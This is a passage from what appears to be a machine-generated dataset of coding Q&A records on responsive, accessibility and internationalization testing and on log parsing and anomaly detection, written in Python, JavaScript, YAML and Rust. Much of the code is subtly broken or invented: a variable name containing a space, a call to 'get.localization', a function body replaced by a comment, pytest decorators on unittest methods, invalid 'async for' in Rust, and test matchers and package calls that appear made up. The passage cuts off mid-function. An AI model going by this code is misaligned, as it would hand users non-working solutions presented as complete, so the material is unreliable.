desired_caps[\"udid\"] = \"your_device_udid\"  # Replace with actual device UDID\n    elif device[\"platformName\"] == \"Android\":\n        desired_caps[\"appPackage\"] = \"your.app.package.name\"  # Replace with your app package\n        desired_caps[\"appActivity\"] = \".YourMainActivity\"  # Replace with your main activity\n    return appium_webdriver.Remote(\"http://localhost:4723/wd/hub\", desired_caps)\n\n# Function to perform responsive testing on a given driver\ndef perform_responsive_test(driver):\n    # Load the web application\n    driver.get(\"https://your-web-app-url.com\")\n\n    # Test various screen sizes and orientations\n    for width in range(320, 1440, 100):\n        for height in range(480, 2560, 100):\n            for orientation in [\"portrait\", \"landscape\"]:\n                driver.set_window_size(width, height)\n                if orientation == \"landscape\":\n                    driver.swipe(0, height // 2, width, height // 2, 1000)\n\n                # Perform complex UI checks, such as element visibility, tap targets, and layout\n                # Also, measure performance metrics like page load time, network requests, and CPU usage\n                # ...\n\n                # Rotate screen if necessary\n                if orientation == \"landscape\":\n                    driver.set_window_size(height, width)\n\n    # Perform user interactions, such as scrolling, tapping, and form submissions\n    # ...\n\n    # Close the driver when done\n    driver.quit()\n\n# Run the tests for each device\nfor device in devices:\n    driver = init_mobile_driver(device)\n    perform_responsive_test(driver)\n```\n\nQuestion 2:\nProblem: Develop a machine learning model to predict potential layout issues in a mobile web application based on screen size and device type data, helping to optimize the app for better responsiveness.\n\nSolution (using Python with TensorFlow and scikit-learn):\nConcept: Machine Learning, Regression, Data preprocessing\n\n```python\nimport pandas as pd\nimport numpy as np\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.preprocessing import StandardScaler\nfrom tensorflow.keras.models import Sequential\nfrom tensorflow.keras.layers import Dense, Dropout\nfrom tensorflow.keras.optimizers import Adam\n\n# Load the dataset containing screen size, device type, and known layout issues\ndata = pd.read_csv(\"mobile_layout_data.csv\")\n\n# Preprocess the data\nX = data[['screen_width', 'screen_height', 'device_type']]\ny = data['layout_issues'].values\n\n# One-hot encode the device_type column\nX = pd.get_dummies(X, columns=['device_type'])\n\n# Split the data into training and testing sets\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\n\n# Standardize the features\nscaler = StandardScaler()\nX_train = scaler.fit_transform(X_train)\nX_test = scaler.transform(X_test)\n\n# Build the model\nmodel = Sequential([\n    Dense(64, input_shape=(X_train.shape[1],), activation='relu'),\n    Dropout(0.2),\n    Dense(128, activation='relu'),\n    Dropout(0.2),\n    Dense(1, activation='sigmoid')\n])\n\n# Compile the model\nmodel.compile(optimizer=Adam(learning_rate=0.001), loss='binary_crossentropy', metrics=['accuracy'])\n\n# Train the model\nhistory = model.fit(X_train, y_train, epochs=100, validation_split=0.1)\n\n# Predict layout issues for new screen sizes and device types\ntest_screen_width = 360\ntest_screen_height = 640\ntest_device_type = [1, 0, 0, 0]  # E.g., 1 for 'Smartphone', 0 for others\ntest_input = np.array([[test_screen_width, test_screen_height] + test_device_type])\ntest_input = scaler.transform(test_input)\nlayout_issues_pred = model.predict(test_input)\n\n# Output the predicted layout issues\nprint(f\"Predicted layout issues: {layout_issues_pred[0][0]}\")\n```\nThese solutions involve complex testing frameworks for web applications and machine learning models to predict potential layout issues. They require expertise in software testing, web development, and machine learning to implement successfully."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Accessibility compliance", "Complexity_Level": "medium", "Response": "{\"Concept\" : \"Accessibility Compliance\"}\nQuestion 1:\nProblem: You have been tasked with ensuring a web application meets WCAG 2.1 Level AA accessibility guidelines. You need to verify if the proper color contrast is being used for text elements on different background colors. Write a function in Python using the `wcag21` package to check if a given color combination meets the contrast ratio requirement.\n\nSolution:\n```python\nfrom wcag21 import contrast\n\ndef check_color_contrast(text_color, background_color):\n    ratio = contrast(text_color, background_color)\n    if ratio >= 4.5:  # WCAG 2.1 Level AA requires a contrast ratio of at least 4.5:1 for normal text\n        return True\n    else:\n        return False\n\n# Example usage\ntext_color = (255, 0, 0)  # Red\nbackground_color = (255, 255, 255)  # White\nis_compliant = check_color_contrast(text_color, background_color)\nprint(f\"Is compliant: {is_compliant}\")  # Output: Is compliant: False\n```\n\n{\"Concept\" : \"Automation Testing\"}\nQuestion 2:\nProblem: Develop a JavaScript function to automate the testing of form input labels for proper association with their respective form elements. The function should iterate through all form elements, check if they have an associated `aria-label` or `aria-labelledby` attribute, and log an error if they don't.\n\nSolution:\n```javascript\nfunction testFormAccessibility(formElement) {\n  const formInputs = formElement.querySelectorAll('input, textarea, select');\n\n  formInputs.forEach(input => {\n    const hasAriaLabel = input.hasAttribute('aria-label');\n    const hasAriaLabelledby = input.hasAttribute('aria-labelledby');\n\n    if (!hasAriaLabel && !hasAriaLabelledby) {\n      console.error(`Input with ID ${input.id} lacks an associated aria-label or aria-labelledby.`);\n    }\n  });\n}\n\n// Example usage\nconst myForm = document.getElementById('my-form');\ntestFormAccessibility(myForm);\n```\nIn this example, the `testFormAccessibility` function checks all form input elements within a given form element (in this case, `my-form`) for the presence of either an `aria-label` or `aria-labelledby` attribute. If an input doesn't have either, it logs an error message to the console. This helps to ensure that form elements are properly labeled for accessibility."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Accessibility compliance", "Complexity_Level": "extremely difficult", "Response": "Unfortunately, the provided JSON doesn't contain a direct reference to \"Quality Assurance\" or \"Accessibility compliance.\" However, you can consider the topic of \"Web Development\" as a related domain since accessibility is an essential aspect of building web applications.\n\nQuestion 1: Develop a comprehensive automated testing suite that verifies compliance with the Web Content Accessibility Guidelines (WCAG) 2.1 Level AA for a complex, dynamic single-page application (SPA) built with React. The suite should include tests for keyboard navigation, color contrast, and form accessibility.\n\n**Concept**: Unit Testing, Accessibility Compliance, React, Testing Libraries\n\n**Solution**:\n```jsx\n// Install necessary packages\nnpm install --save-dev jest @testing-library/react @testing-library/user-event axe-core jest-axe\n\n// Create a custom Jest setup file to integrate axe-core\n// Create `jest.config.js`:\nmodule.exports = {\n  setupFilesAfterEnv: ['<rootDir>/setupTests.js'],\n};\n\n// Create `setupTests.js`:\nimport 'jest-axe/extend-expect';\nimport axe from 'axe-core/axe';\n\nwindow.axe = axe;\n\n// Write a test case for keyboard navigation\n// Create `App.test.js`:\nimport React from 'react';\nimport { render, fireEvent, screen } from '@testing-library/react';\nimport App from './App';\n\ntest('verifies keyboard navigation on a complex component', () => {\n  render(<App />);\n  const firstFocusableElement = screen.getByRole('tab', { name: 'Tab 1' });\n  fireEvent.focus(firstFocusableElement);\n\n  const tabList = screen.getAllByRole('tab');\n  tabList.forEach((tab, index) => {\n    if (index === 0) return;\n\n    fireEvent.keyDown(tabList[index - 1], { key: 'Tab', code: 'Tab' });\n    expect(tab).toHaveFocus();\n  });\n});\n\n// Write a test case for color contrast\ntest('verifies color contrast meets WCAG 2.1 guidelines', async () => {\n  render(<App />);\n  const textElements = screen.getAllByRole('text');\n\n  await expect(textElements).toHaveNoAxeViolations('Color contrast violations');\n\n  textElements.forEach((element) => {\n    if (element.style.color || element.style.backgroundColor) {\n      expect(element).toHaveComputedStyle({\n        color: 'valid_color_value', // Replace with a regex or custom check for valid color contrast\n        backgroundColor: 'valid_color_value', // Replace with a regex or custom check for valid color contrast\n      });\n    }\n  });\n});\n\n// Write a test case for form accessibility\ntest('verifies form accessibility with axe-core', async () => {\n  render(<App />);\n  const form = screen.getByRole('form');\n\n  await expect(form).toHaveNoAxeViolations('Form accessibility violations');\n\n  const inputs = screen.getAllByRole('input');\n  inputs.forEach((input) => {\n    expect(input).toHaveAttribute('aria-label', expect.any(String));\n    if (input.type === 'checkbox' || input.type === 'radio') {\n      expect(input).toHaveAttribute('aria-checked', 'false'); // Adjust based on initial state\n    }\n  });\n});\n```\nThis solution demonstrates how to set up an automated testing suite using Jest, React Testing Library, and axe-core for testing accessibility in a React application. It covers keyboard navigation, color contrast, and form accessibility.\n\nQuestion 2: Implement a testing infrastructure to monitor real-time accessibility issues on a live, server-rendered website with thousands of pages. The infrastructure should be highly scalable, provide real-time feedback, and integrate with an error tracking system like Sentry.\n\n**Concept**: Continuous Integration, Monitoring, Server-side Rendering, Sentry Integration\n\n**Solution**:\nThis solution requires an existing CI/CD pipeline, a server-rendered website, and an integration with a service like Sentry. Here's a high-level overview:\n\n1. **Set up accessibility scanner**: Use an open-source accessibility scanner like `pa11y` or `accessibility-insights-action` to run automated checks on each page.\n2. **Integrate with CI/CD**: Configure the scanner to run during the build or deploy stage of your CI/CD pipeline. For example, if using GitHub Actions, create a new workflow that runs on every push or deploy.\n3. **Scalable execution**: To handle thousands of pages, divide the pages into smaller batches and run the scanner in parallel or in separate jobs.\n4. **Real-time feedback**: Send the scanner's output to a message broker (e.g., Apache Kafka or RabbitMQ) to allow for real-time processing and notifications.\n5. **Error tracking**: Create a consumer for the message broker that integrates with Sentry. When an accessibility issue is found, send an event to Sentry with details like the page URL, issue type, and recommended fixes.\n\n```yaml\n# Example GitHub Actions workflow (accessibility-insights-action)\nname: Accessibility Scan\n\non:\n  push:\n    branches:\n      - main\n  schedule:\n    - cron: '0 0 * * *' # Daily at midnight\n\njobs:\n  accessibility-scan:\n    runs-on: ubuntu-latest\n    concurrency:\n      group: accessibility-scan\n      cancel-in-progress: true\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v3\n      - name: Setup Node.js\n        uses: actions/setup-node@v3\n        with:\n          node-version: '16'\n      - name: Install dependencies\n        run: npm ci\n      - name: Run accessibility scan\n        id: scan\n        uses: Microsoft/AccessibilityInsightsAction@v2\n        with:\n          scanType: full\n          target: 'http://example.com' # Replace with your site's URL\n      - name: Send issues to Kafka (example)\n        run: |\n          # Assuming you have a Kafka instance running and a script to send data\n          npm install kafka-node\n          node send_to_kafka.js ${{ steps.scan.outputs.issues }}\n      - name: Sentry integration (example)\n        run: |\n          # Assuming you have Sentry CLI installed and configured\n          npx sentry-cli issues create --extra '{\"source\": \"accessibility\", \"url\": \"$URL\", \"issue_type\": \"$TYPE\", \"description\": \"$DESCRIPTION\"}' # Replace placeholders with actual issue data\n```\nThis solution outline shows how to integrate accessibility scanning into a CI/CD process, utilize a message broker for real-time feedback, and report issues to an error tracking system like Sentry. Keep in mind that this is a simplified example, and you would need to adapt it to your specific infrastructure and tools."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Internationalization checks", "Complexity_Level": "medium", "Response": "Concept: Internationalization checks\n\nQuestion 1: How can you ensure a web application is properly handling strings and displaying dates in different locales while maintaining correct formatting?\n\nSolution: One approach is to use a library like `moment.js` for dates and `i18next` for strings in a JavaScript-based web application. Here's an example of how you can handle date formatting and string translations:\n\n```javascript\n// Install moment.js and i18next\nnpm install moment i18next i18next-browser-languagedetector moment-locales\n\n// Import the necessary modules\nimport i18n from 'i18next';\nimport LanguageDetector from 'i18next-browser-languagedetector';\nimport Moment from 'moment';\nimport en from 'moment/locale/en';\nimport fr from 'moment/locale/fr';\n\n// Initialize i18next for strings\ni18n\n  .use(LanguageDetector)\n  .init({\n    fallbackLng: 'en',\n    resources: {\n      en: { translation: { hello: 'Hello world' } },\n      fr: { translation: { hello: 'Bonjour le monde' } },\n    },\n    keySeparator: false,\n  });\n\n// Initialize moment.js for dates and add locales\nMoment.locale('en', en);\nMoment.locale('fr', fr);\n\n// Function to get formatted date based on locale\nfunction formatDate(locale, date) {\n  return Moment(date).locale(locale).format('LL');\n}\n\n// Example usage\ndocument.getElementById('greeting').innerText = i18n.t('hello');\ndocument.getElementById('date').innerText = formatDate(navigator.language, '2022-01-01');\n\n// Changing language\ni18n.changeLanguage('fr').then(() => {\n  document.getElementById('greeting').innerText = i18n.t('hello');\n  document.getElementById('date').innerText = formatDate('fr', '2022-01-01');\n});\n```\n\nQuestion 2: How can you test that a web application is correctly handling right-to-left (RTL) languages like Arabic or Hebrew?\n\nSolution: You can test RTL support using CSS, HTML, and JavaScript to simulate and validate the layout changes for RTL languages. Here's an example using JavaScript and CSS:\n\n```html\n<!DOCTYPE html>\n<html lang=\"ar\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <style>\n    body {\n      direction: rtl;\n      unicode-bidi: embed;\n    }\n    .ltr {\n      direction: ltr;\n      unicode-bidi: embed;\n    }\n  </style>\n  <script>\n    function toggleRTL() {\n      const isRTL = document.body.getAttribute('dir') === 'rtl';\n      document.body.setAttribute('dir', isRTL ? 'ltr' : 'rtl');\n    }\n  </script>\n</head>\n<body>\n  <h1>\u0645\u0631\u062d\u0628\u0627 \u0628\u0627\u0644\u0639\u0627\u0644\u0645</h1>\n  <p class=\"ltr\">Hello, world!</p>\n  <button onclick=\"toggleRTL()\">Toggle RTL</button>\n</body>\n</html>\n```\n\nIn this example, the HTML `lang` attribute is set to 'ar' for Arabic, which triggers right-to-left text direction. The CSS styles ensure that the layout adapts to the RTL mode. The JavaScript function `toggleRTL` allows you to switch between RTL and left-to-right (LTR) modes. By testing the layout and text direction changes, you can verify the application's RTL support."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Internationalization checks", "Complexity_Level": "extremely difficult", "Response": "The provided JSON doesn't contain a direct category for \"Quality Assurance\" or \"Internationalization checks.\" However, we can create a problem related to internationalization (i18n) in the context of software development, which often includes aspects of quality assurance.\n\nQuestion 1: Develop a comprehensive unit test suite for an application's internationalization features, ensuring proper handling of complex character sets, right-to-left (RTL) languages, and date/time formats across multiple locales, while also detecting any missing translations.\n\nSolution:\nConcept: \"Testing Framework\" (for example, using Python's `unittest`)\n\n```python\nimport unittest\nimport pytest\nfrom babel.dates import format_datetime\nfrom babel.localedata import locale_identifiers\nfrom app.i18n import get.localization, render_template\n\nclass I18NTestCase(unittest.TestCase):\n    @pytest.mark.parametrize(\"locale\", locale_identifiers())\n    def test_complex_characters(self, locale):\n        translated_string = get.localization(locale, \"complex_string\")\n        self.assertNotIn(\"\\ufffd\", translated_string, f\"Invalid character found in {locale}\")\n\n    @pytest.mark.parametrize(\"locale\", [\"ar\", \"fa\", \"he\"])  # Example RTL locales\n    def test_rtl_languages(self, locale):\n        rendered_html = render_template(\"template.html\", locale=locale)\n        self.assertIn(\"dir='rtl'\", rendered_html, f\"RTL direction not applied for {locale}\")\n\n    @pytest.mark.parametrize(\"locale, date, expected_format\", [\n        (\"en_US\", \"2023-02-20\", \"%m/%d/%Y\"),\n        (\"fr_FR\", \"2023-02-20\", \"%d/%m/%Y\"),\n        (\"ar_EG\", \"2023-02-20\", \"%Y-%m-%d\"),\n    ])\n    def test_date_formatting(self, locale, date, expected_format):\n        formatted_date = format_datetime(date, \"medium\", locale=locale)\n        self.assertIn(expected_format, formatted_date, f\"Incorrect date format for {locale}\")\n\n    def test_missing_translations(self):\n        for locale in locale_identifiers():\n            missing_keys = get.missing_translations(locale)\n            self.assertEqual(missing_keys, [], f\"Missing translations found for {locale}\")\n\nif __name__ == '__main__':\n    unittest.main()\n```\n\nQuestion 2: Create a continuous integration (CI) pipeline that runs an automated localization linter tool, checking for consistency, formatting issues, and unused translations across multiple translation files in a large codebase. The pipeline should also generate a detailed report and block the merge if any issues are found.\n\nSolution:\nConcept: \"Continuous Integration\" (using a tool like Jenkins or GitHub Actions)\n\n**GitHub Actions Example:**\n\n`ci.yml` (GitHub Actions workflow file)\n\n```yaml\nname: i18n Lint and Verify\n\non:\n  push:\n    branches:\n      - main\n  pull_request:\n    types: [opened, synchronize, reopened]\n\njobs:\n  lint_i18n:\n    runs-on: ubuntu-latest\n    steps:\n    - name: Checkout code\n      uses: actions/checkout@v2\n\n    - name: Install dependencies\n      run: |\n        pip install --upgrade pip\n        pip install i18n-linter\n\n    - name: Run i18n linter\n      run: |\n        i18n-linter --config .i18n-linter.yml --verbose --output report.txt\n\n    - name: Check for issues\n      run: |\n        if grep -q 'ERROR' report.txt; then\n          echo \"Found i18n issues. Please fix before merging.\"\n          exit 1\n        fi\n\n    - name: Upload report (if any)\n      if: always()\n      uses: actions/upload-artifact@v2\n      with:\n        name: i18n-report\n        path: report.txt\n\n```\n\n`.i18n-linter.yml` (i18n-linter configuration file)\n\n```yaml\nlocales:\n  - en\n  - fr\n  - es\n  - de\n\nformat: po\nignore_files:\n  - 'tests/**'\n  - 'docs/**'\n\nchecks:\n  - unused\n  - consistency\n  - formatting\n```\n\nThis pipeline runs `i18n-linter` on the codebase, checks for errors, and uploads a report as an artifact. If the linter finds any issues, the pipeline will fail, preventing the merge. Note that you might need to adapt this example based on the specific i18n linter or CI/CD tool you choose to use."}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Parsing logs into structured templates", "Complexity_Level": "medium", "Response": "\"Log Analysis (Text -> Text)\" is not directly mentioned in the provided JSON. However, it is related to the broader domain of data processing and can be connected to various programming languages and technologies like Python, log parsing libraries (e.g., `loguru`, `structlog`, or `regex`), and text processing.\n\nHere, we can consider the \"Programming Language Concepts\" category, specifically focusing on \"Data\" and \"Function\" concepts.\n\nMedium Difficulty Problem 1:\n**Concept:** Data Processing and Functions\n\nProblem: Design a Python function that takes a log entry as input and parses it into a structured dictionary following a common log template. The log entry has the following format:\n\n```\n[LEVEL] [TIMESTAMP] [LOGGER_NAME] - MESSAGE\n```\n\nExample log entry:\n```\n[INFO] [2023-03-20 15:45:30,891] [app.logger] - User with ID 123 logged in successfully.\n```\n\nSolution:\n```python\nimport re\n\ndef parse_log_entry(log_entry):\n    pattern = r'\\[(\\w+)\\] \\[(\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}(?:,\\d{3})?)\\] \\[(.*)\\] - (.*)'\n    match = re.match(pattern, log_entry)\n    \n    if match:\n        level, timestamp, logger_name, message = match.groups()\n        return {\n            \"level\": level,\n            \"timestamp\": timestamp,\n            \"logger_name\": logger_name,\n            \"message\": message\n        }\n    else:\n        raise ValueError(\"Invalid log entry format\")\n\nexample_entry = \"[INFO] [2023-03-20 15:45:30,891] [app.logger] - User with ID 123 logged in successfully.\"\nparsed_entry = parse_log_entry(example_entry)\nprint(parsed_entry)\n```\nThis solution uses regular expressions to extract the relevant information from the log entry and returns it as a structured dictionary.\n\nMedium Difficulty Problem 2:\n**Concept:** Data Processing and Higher Order Functions\n\nProblem: Given a list of log entries, create a Python function that filters out entries with a given log level and returns a list of structured dictionaries. Use higher-order functions for the solution.\n\nExample log entries:\n```\nentries = [\n    \"[INFO] [2023-03-20 15:45:30,891] [app.logger] - User with ID 123 logged in successfully.\",\n    \"[ERROR] [2023-03-20 15:46:10,567] [app.error_handler] - Failed to fetch data from API.\",\n    \"[DEBUG] [2023-03-20 15:47:01,234] [app.debug] - Debugging session started.\"\n]\n```\n\nSolution:\n```python\nimport re\nfrom functools import partial\n\ndef parse_log_entry(log_entry):\n    # Same as Problem 1\n\ndef filter_logs_by_level(entries, level):\n    parse_entry = partial(parse_log_entry)\n    return list(filter(lambda entry: entry[\"level\"] == level, map(parse_entry, entries)))\n\nexample_entries = [\n    \"[INFO] [2023-03-20 15:45:30,891] [app.logger] - User with ID 123 logged in successfully.\",\n    \"[ERROR] [2023-03-20 15:46:10,567] [app.error_handler] - Failed to fetch data from API.\",\n    \"[DEBUG] [2023-03-20 15:47:01,234] [app.debug] - Debugging session started.\"\n]\n\nfiltered_errors = filter_logs_by_level(example_entries, \"ERROR\")\nprint(filtered_errors)\n```\nThis solution uses partial function application and the `filter` and `map` higher-order functions to filter and parse log entries based on a given log level."}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Parsing logs into structured templates", "Complexity_Level": "extremely difficult", "Response": "Area: \"Log Analysis (Text -> Text)\"  \nSub Area: \"Parsing logs into structured templates\"\n\nQuestion 1:\nSuppose you are working on a large-scale distributed system where multiple components generate complex logs with nested JSON objects and various levels of severity. Develop an efficient algorithm in Python that can parse these logs, extract nested fields, and create a structured Elasticsearch index for real-time querying and analysis.\n\nProblem:\nEfficiently parse nested JSON structures in complex logs and map them to a predefined Elasticsearch index schema while handling different log formats and severity levels.\n\nSolution:\nWe can use Python's `json` library to parse the JSON logs and Elasticsearch's `elasticsearch` library to interact with the Elasticsearch cluster. The algorithm will involve the following steps:\n\n1. Define a dictionary to map the log fields to the Elasticsearch index fields.\n2. Parse the JSON log and extract nested fields.\n3. Normalize the extracted fields according to the mapping.\n4. Index the structured data into Elasticsearch.\n\nExample code:\n\n```python\nimport json\nfrom elasticsearch import Elasticsearch\n\n# Define Elasticsearch client\nes = Elasticsearch()\n\n# Define log field mapping\nfield_mapping = {\n    \"timestamp\": \"date\",\n    \"component\": \"keyword\",\n    \"level\": \"keyword\",\n    \"nested_field1\": {\n        \"type\": \"nested\",\n        \"properties\": {\n            \"sub_field1\": \"keyword\",\n            \"sub_field2\": \"integer\"\n        }\n    },\n    \"message\": \"text\"\n}\n\ndef parse_and_index_log(log_entry):\n    try:\n        log_data = json.loads(log_entry)\n        \n        # Normalize extracted fields\n        normalized_data = {}\n        for field, target_type in field_mapping.items():\n            if field in log_data:\n                if isinstance(target_type, dict):  # Handle nested fields\n                    nested_data = {}\n                    for sub_field, sub_type in target_type['properties'].items():\n                        if sub_field in log_data[field]:\n                            nested_data[sub_field] = log_data[field][sub_field]\n                    normalized_data[field] = nested_data\n                else:\n                    normalized_data[field] = log_data[field]\n            else:\n                normalized_data[field] = None\n\n        # Index the structured data into Elasticsearch\n        res = es.index(index=\"log_data\", id=log_data['timestamp'], body=normalized_data)\n        print(f\"Indexed log with ID: {res['result']}\")\n\n    except json.JSONDecodeError as e:\n        print(f\"Error decoding JSON: {e}\")\n\n# Example log entry\nlog_entry = '''\n{\n    \"timestamp\": \"2023-03-22T15:42:10.123Z\",\n    \"component\": \"auth\",\n    \"level\": \"INFO\",\n    \"nested_field1\": [\n        {\"sub_field1\": \"user1\", \"sub_field2\": 123},\n        {\"sub_field1\": \"user2\", \"sub_field2\": 456}\n    ],\n    \"message\": \"User authentication successful.\"\n}\n'''\n\nparse_and_index_log(log_entry)\n```\n\nQuestion 2:\nIn a high-traffic web application, you need to process real-time HTTP access logs and extract specific patterns, such as user agent strings and response codes, to identify potential security risks or performance bottlenecks. Write a Rust program that efficiently parses the logs, filters out non-matching entries, and streams the results to a Kafka topic for further analysis.\n\nProblem:\nParse real-time HTTP access logs, filter specific patterns, and stream the results to a Kafka topic.\n\nSolution:\nUse Rust's `regex` library for pattern matching, `tokio` for asynchronous I/O, and `rust-kafka` for interacting with the Kafka cluster.\n\nExample code:\n\n```rust\nuse std::fs::File;\nuse std::io::{BufRead, BufReader};\nuse regex::Regex;\nuse tokio::fs::File as AsyncFile;\nuse tokio::io::{AsyncReadExt, BufReader as AsyncBufReader};\nuse kafka::producer::{AsyncProducer, Record};\n\n#[tokio::main]\nasync fn main() -> Result<(), Box<dyn std::error::Error>> {\n    let regex = Regex::new(r\"(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}) - - \\[([^\\]]+)\\] \\\"(GET|POST) (.*) HTTP/1\\.1\\\" (\\d{3}) (\\d+) \\\"(.*)\\\" \\\"(.*)\\\"\")?;\n\n    let producer = AsyncProducer::from_hosts(vec![\"localhost:9092\"])\n        .create().await?;\n\n    let file = AsyncFile::open(\"access.log\").await?;\n    let reader = AsyncBufReader::new(file);\n\n    async for line in reader.lines() {\n        let line = line?;\n        let match_data = regex.captures(&line).unwrap();\n\n        // Extract relevant fields\n        let ip_address = match_data[1].to_owned();\n        let timestamp = match_data[2].to_owned();\n        let method = match_data[3].to_owned();\n        let path = match_data[4].to_owned();\n        let status_code = match_data[5].parse::<u16>().unwrap();\n        let user_agent = match_data[6].to_owned();\n\n        // Filter based on status code (e.g., errors)\n        if status_code >= 400 {\n            let record = Record::new(\"http_logs\".to_owned(), \"events\".to_owned(), vec![], (ip_address, timestamp, method, path, status_code, user_agent).to_string());\n            producer.send_all(&[record]).await?;\n        }\n    }\n\n    Ok(())\n}\n```\n\n**Concept**: Log Analysis (Text -> Text)"}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Finding anomalies from raw logs", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Develop a script that reads raw log files, identifies lines containing error messages, and calculates the frequency of each unique error type.\n\nConcept: Text Processing, File Handling\n\nSolution in Python:\n\n```python\nimport re\nfrom collections import Counter\n\ndef find_anomalies(log_file_path):\n    error_patterns = ['error', 'exception', 'fault']\n    error_counter = Counter()\n    with open(log_file_path, 'r') as log_file:\n        for line in log_file:\n            for pattern in error_patterns:\n                if re.search(pattern, line, re.IGNORECASE):\n                    error_type = re.search(f'\\b{pattern}\\b', line, re.IGNORECASE).group()\n                    error_counter[error_type] += 1\n                    break\n    return error_counter\n\nlog_file_path = 'path_to_your_log_file.log'\nanomaly_counts = find_anomalies(log_file_path)\nfor error_type, count in anomaly_counts.most_common():\n    print(f'{error_type}: {count}')\n\n```\nThis script reads a log file, searches for lines containing error-related keywords, counts the occurrences of each unique error type, and prints the top errors by frequency.\n\nQuestion 2:\nProblem: Create a script that extracts IP addresses from log files and identifies the ones that appear more frequently than a specified threshold.\n\nConcept: Text Processing, Pattern Matching\n\nSolution in Python:\n\n```python\nimport re\nfrom collections import Counter\n\ndef find_frequent_ips(log_file_path, threshold):\n    ip_pattern = r'\\b(?:[0-9]{1,3}\\.){3}[0-9]{1,3}\\b'\n    ip_counter = Counter()\n    with open(log_file_path, 'r') as log_file:\n        for line in log_file:\n            ips_in_line = re.findall(ip_pattern, line)\n            ip_counter.update(ips_in_line)\n    frequent_ips = {ip: count for ip, count in ip_counter.items() if count > threshold}\n    return frequent_ips\n\nlog_file_path = 'path_to_your_log_file.log'\nthreshold = 5\nfrequent_ips = find_frequent_ips(log_file_path, threshold)\nfor ip, count in frequent_ips.items():\n    print(f'IP: {ip}, Frequency: {count}')\n\n```\nThis script reads a log file, extracts IP addresses using regular expressions, counts the occurrences of each IP, and prints the IPs that appear more than the specified threshold times."}, {"L2_TASK": "Log Analysis (Text -> Text)", "L3_TASK": "Finding anomalies from raw logs", "Complexity_Level": "extremely difficult", "Response": "Question 1: \n\nGiven a large dataset of raw server logs, develop a program that can identify and classify anomalies based on a combination of patterns, such as unusual request rates, error codes, and IP addresses. The program should use natural language processing techniques to extract meaningful information from the text logs and perform time-series analysis to detect temporal anomalies.\n\nConcept: Natural Language Processing, Time-Series Analysis\n\n```python\nimport pandas as pd\nimport numpy as np\nimport re\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.decomposition import TruncatedSVD\nfrom sklearn.cluster import KMeans\nfrom dateutil import parser\nfrom statsmodels.tsa.seasonal import seasonal_decompose\nimport matplotlib.pyplot as plt\n\ndef parse_log_entry(entry):\n    # Custom function to parse log entry and return relevant data\n    timestamp, ip, status_code, request = re.split(r'\\s+', entry, maxsplit=4)\n    return timestamp, ip, int(status_code), request\n\ndef extract_features(logs):\n    data = []\n    for entry in logs:\n        timestamp, ip, status_code, request = parse_log_entry(entry)\n        data.append((timestamp, ip, status_code, request))\n    \n    data_df = pd.DataFrame(data, columns=['timestamp', 'ip', 'status_code', 'request'])\n    \n    # Preprocessing for NLP\n    vectorizer = TfidfVectorizer(stop_words='english', ngram_range=(1, 3))\n    request_matrix = vectorizer.fit_transform(data_df['request'])\n    svd = TruncatedSVD(n_components=50)\n    request embeddings = svd.fit_transform(request_matrix)\n    \n    # Time-series analysis\n    data_df['timestamp'] = pd.to_datetime(data_df['timestamp'])\n    data_df = data_df.set_index('timestamp')\n    decomposed = seasonal_decompose(data_df['status_code'], model='additive', freq=60)\n    \n    return data_df, request embeddings, decomposed\n\ndef detect_anomalies(data_df, request_embeddings, decomposition):\n    # Cluster IPs based on request embeddings\n    kmeans = KMeans(n_clusters=5, init='k-means++', random_state=42)\n    ip_clusters = kmeans.fit_predict(request_embeddings)\n    \n    # Identify temporal anomalies\n    anomalies = decomposition.trend.abs() > np.quantile(decomposition.trend.abs(), 0.99)\n    \n    # Combine IP clustering and temporal anomalies\n    anomalous_ips = data_df[data_df['ip'].isin(data_df['ip'][ip_clusters == anomalies.argmax()])]\n    anomalous_requests = anomalous_ips[anomalies]\n    \n    return anomalous_ips, anomalous_requests\n\n# Load raw logs\nlogs = open('server_logs.txt', 'r').readlines()\n\n# Analyze logs and detect anomalies\ndata_df, request_embeddings, decomposition = extract_features(logs)\nanomalous_ips, anomalous_requests = detect_anomalies(data_df, request_embeddings, decomposition)\n\n# Print identified anomalies\nprint(f\"Anomalous IPs: {anomalous_ips['ip'].tolist()}\")\nprint(\"Anomalous Requests:\")\nprint(anomalous_requests[['status_code', 'request']].to_string(index=False))\n```\n\nQuestion 2:\n\nDevelop a reinforcement learning algorithm to dynamically adjust log monitoring thresholds based on historical data and real-time events. The algorithm should minimize false positives and false negatives while adapting to changing conditions in the system.\n\nConcept: Reinforcement Learning\n\n```python\nimport gym\nimport numpy as np\nimport pandas as pd\nfrom datetime import timedelta\nfrom stable_baselines3 import PPO\nfrom stable_baselines3.common.noise import NormalActionNoise\n\nclass LogMonitoringEnv(gym.Env):\n    def __init__(self, logs, threshold_bounds):\n        self.log_data = logs\n        self.threshold = (threshold_bounds[0], threshold_bounds[1])\n        self.action_space = gym.spaces.Box(low=threshold_bounds[0], high=threshold_bounds[1], shape=(1,))\n        self.observation_space = gym.spaces.Box(low=0, high=1, shape=(len(logs),))\n        self.reward_range = (-1, 1)\n        self.step_count = 0\n        self.t = 0\n\n    def reset(self):\n        self.step_count = 0\n        self.t = 0\n        return np.array(self.log_data[self.t:self.t+1])\n\n    def step(self, action):\n        self.step_count += 1\n        self.t += 1\n        if self.t >= len(self.log_data):\n            done = True\n        else:\n            done = False\n\n        observation = np.array(self.log_data[self.t:self.t+1])\n        reward = self.calculate_reward(action, observation)\n        return observation, reward, done, {}\n\n    def calculate_reward(self, action, observation):\n        # Custom reward function based on false positives/negatives\n        pass\n\n    def render(self, 